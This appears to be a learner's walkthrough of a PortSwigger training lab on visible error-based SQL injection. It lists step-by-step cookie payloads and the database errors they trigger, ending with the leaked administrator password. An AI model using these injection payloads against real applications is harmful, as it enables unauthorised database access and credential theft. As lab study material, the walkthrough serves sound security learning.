# Lab: Visible error-based SQL injection
url: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

# Overview:
- This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

- The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 

# Analysis:

Cookie: TrackingId=yKUtNIhCNiXJFhhL

Cookie: TrackingId=yKUtNIhCNiXJFhhL'
-> Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'yKUtNIhCNiXJFhhL''. Expected  char

Cookie: TrackingId=yKUtNIhCNiXJFhhL'-- <OK>

Cookie: TrackingId=yKUtNIhCNiXJFhhL' AND CAST((SELECT 1) AS int)--
-> ERROR: argument of AND must be type boolean, not type integer Position: 63

Cookie: TrackingId=yKUtNIhCNiXJFhhL' AND 1=CAST((SELECT 1) AS int)-- <OK>

Cookie: TrackingId=yKUtNIhCNiXJFhhL' AND 1=CAST((SELECT username FROM users) AS int)--
-> Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'yKUtNIhCNiXJFhhL' AND 1=CAST((SELECT username FROM users) AS'. Expected  char
-> The last query is missing (limited character)
-> delete TrackingId to free up 

Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
-> ERROR: more than one row returned by a subquery used as an expression

Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-> ERROR: invalid input syntax for type integer: "administrator" <OK>

Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-> ERROR: invalid input syntax for type integer: "r33sfpu5yzcnd9kxdxdo" <OK>